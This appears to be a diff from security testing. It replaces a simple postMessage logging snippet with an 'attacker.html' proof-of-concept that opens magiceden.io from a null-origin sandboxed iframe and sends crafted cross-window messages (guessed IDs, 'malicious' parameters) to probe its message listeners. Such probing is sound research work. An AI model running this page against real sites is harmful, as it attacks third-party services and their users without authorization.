@@ -1,7 +1,39 @@
-<script>
-window.addEventListener('message', (event) => {
-  console.log('Received from:', event.origin);
-  console.log('Data:', event.data);
-});
-</script>
-<iframe src="https://dashboard.plaid.com"></iframe>
+<!-- attacker.html -->
+<!DOCTYPE html>
+<html>
+<body>
+<h1>Testing MagicEden postMessage</h1>
+
+<!-- Create null origin iframe -->
+<iframe 
+  sandbox="allow-scripts allow-popups" 
+  srcdoc="
+    <script>
+      // Open MagicEden in new window from null origin
+      const win = window.open('https://magiceden.io', 'metest');
+      
+      // Wait for page to load
+      setTimeout(() => {
+        // Try different message formats
+        win.postMessage({
+          id: 'test123',
+          command: 'someCommand',
+          parameter: 'malicious'
+        }, '*');
+        
+        // Try triggering callbacks (listener #4)
+        win.postMessage({
+          id: '1', // Try sequential IDs
+          data: 'attacker-controlled'
+        }, '*');
+        
+        // Try iframe-ready pattern (listener #6)
+        win.postMessage('iframe-ready-predictable-id', '*');
+        
+      }, 3000);
+    </script>
+  ">
+</iframe>
+
+</body>
+</html>
